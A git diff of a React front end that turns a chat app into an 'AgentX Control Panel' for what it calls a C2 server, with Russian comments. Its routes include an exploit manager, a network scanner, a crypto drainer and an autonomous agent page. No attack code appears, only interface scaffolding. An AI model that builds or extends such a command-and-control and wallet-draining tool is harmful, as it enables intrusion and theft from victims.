@@ -1,59 +1,103 @@
-import React from 'react';
-import { BrowserRouter as Router, Route, Routes } from 'react-router-dom';
-import './App.css';
-import Sidebar from './components/Layout/Sidebar';
-import MainContent from './components/Layout/MainContent';
-import ChatPage from './pages/ChatPage'; // Импортируем страницу чата
-import { ToastContainer } from 'react-toastify'; // <-- Импортируем ToastContainer
-import 'react-toastify/dist/ReactToastify.css';
+import { useState, useEffect } from 'react';
+import { ChakraProvider, Box, Flex, VStack, Grid, theme, Text, Heading, Spinner, useToast } from '@chakra-ui/react';
+import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
+import axios from 'axios';
+
+// Components
+import Sidebar from './components/Sidebar';
+import Dashboard from './pages/Dashboard';
+import AgentsList from './pages/AgentsList';
+import OperationsList from './pages/OperationsList';
+import ExploitManager from './pages/ExploitManager';
+import NetworkScanner from './pages/NetworkScanner';
+import CryptoDrainer from './pages/CryptoDrainer';
+import MevMonitor from './pages/MevMonitor';
+import AutonomousAgent from './pages/AutonomousAgent';
+import Settings from './pages/Settings';
+
+// API Config
+const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:8000';
 
 function App() {
-  const appStyle: React.CSSProperties = {
-    display: 'flex',
-    height: '100vh',
-    color: '#fff', // Общий цвет текста
-  };
+  const [loading, setLoading] = useState(true);
+  const [serverStatus, setServerStatus] = useState<any>(null);
+  const [error, setError] = useState<string | null>(null);
+  const toast = useToast();
 
-  const mainAreaStyle: React.CSSProperties = {
-      display: 'flex',
-      flexDirection: 'column',
-      flexGrow: 1,
-      height: '100vh',
-  };
+  useEffect(() => {
+    // Проверка соединения с сервером при загрузке
+    const checkServerStatus = async () => {
+      try {
+        setLoading(true);
+        const response = await axios.get(`${API_URL}/api/status`);
+        setServerStatus(response.data);
+        setError(null);
+      } catch (err) {
+        console.error('Failed to connect to server:', err);
+        setError('Не удалось подключиться к серверу C2. Убедитесь, что сервер запущен.');
+        toast({
+          title: 'Ошибка соединения',
+          description: 'Не удалось подключиться к серверу C2',
+          status: 'error',
+          duration: 5000,
+          isClosable: true,
+        });
+      } finally {
+        setLoading(false);
+      }
+    };
+
+    checkServerStatus();
+    
+    // Периодическая проверка статуса сервера
+    const intervalId = setInterval(checkServerStatus, 30000); // каждые 30 секунд
+    
+    return () => clearInterval(intervalId);
+  }, [toast]);
+
+  if (loading && !serverStatus) {
+    return (
+      <ChakraProvider theme={theme}>
+        <Flex height="100vh" alignItems="center" justifyContent="center">
+          <VStack spacing={8}>
+            <Heading>AgentX Control Panel</Heading>
+            <Spinner size="xl" />
+            <Text>Подключение к серверу C2...</Text>
+          </VStack>
+        </Flex>
+      </ChakraProvider>
+    );
+  }
 
   return (
-    <Router>
-      <div style={appStyle}>
-        <Sidebar />
-        {/* Обертка для основной области и терминала */}
-        <div style={mainAreaStyle}>
-          <MainContent>
-            <Routes>
-              <Route path="/" element={<ChatPage />} />
-              <Route path="/chat" element={<ChatPage />} />
-              {/* <Route path="/zonds" element={<ZondsPage />} /> */}
-              {/* <Route path="/codex" element={<CodexPage />} /> */}
-              {/* <Route path="/settings" element={<SettingsPage />} /> */}
-              {/* Добавьте другие маршруты здесь */}
-            </Routes>
-          </MainContent>
-          {/* <TerminalPanel /> */} {/* Добавляем терминал под контентом */}
-        </div>
-        {/* Контейнер для уведомлений */}
-        <ToastContainer
-          position="bottom-right"
-          autoClose={3000}
-          hideProgressBar={false}
-          newestOnTop={false}
-          closeOnClick
-          rtl={false}
-          pauseOnFocusLoss
-          draggable
-          pauseOnHover
-          theme="dark"
-        />
-      </div>
-    </Router>
+    <ChakraProvider theme={theme}>
+      <Router>
+        <Flex height="100vh" overflow="hidden">
+          <Sidebar serverStatus={serverStatus} />
+          
+          <Box flex="1" overflow="auto" bg="gray.50" p={4}>
+            {error ? (
+              <Box p={5} bg="red.50" borderRadius="md" borderWidth="1px" borderColor="red.200">
+                <Heading size="md" color="red.500" mb={2}>Ошибка подключения</Heading>
+                <Text>{error}</Text>
+              </Box>
+            ) : (
+              <Routes>
+                <Route path="/" element={<Dashboard />} />
+                <Route path="/agents" element={<AgentsList />} />
+                <Route path="/operations" element={<OperationsList />} />
+                <Route path="/exploits" element={<ExploitManager />} />
+                <Route path="/scanner" element={<NetworkScanner />} />
+                <Route path="/crypto-drainer" element={<CryptoDrainer />} />
+                <Route path="/mev-monitor" element={<MevMonitor />} />
+                <Route path="/autonomous-agent" element={<AutonomousAgent />} />
+                <Route path="/settings" element={<Settings />} />
+              </Routes>
+            )}
+          </Box>
+        </Flex>
+      </Router>
+    </ChakraProvider>
   );
 }
 
